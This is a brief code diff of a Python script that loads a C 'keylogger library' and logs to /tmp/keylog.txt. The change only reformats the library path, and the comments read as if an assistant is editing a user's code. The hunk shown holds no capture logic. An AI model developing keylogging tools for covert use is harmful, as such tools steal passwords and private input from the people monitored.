@@ -10,8 +10,9 @@ LOG_FILE = "/tmp/keylog.txt"
 # Load the C-based keylogger library
 # Using os.environ['HOME'] is fine, but os.path.expanduser("~") is often preferred.
 # I'll keep your original path construction style for consistency.
-lib_path = os.path.join(os.environ['HOME'], "Documents", "VRS", "test.so")
+lib_path = os.path.join(os.environ['HOME'], "Documents/VRS/test.so")
 keylogger_lib = cdll.LoadLibrary(lib_path)
+
 
 # Define argument types for the C function for safer interaction
 # Assuming C function signature: int write(int fd, const char *buf, size_t count);
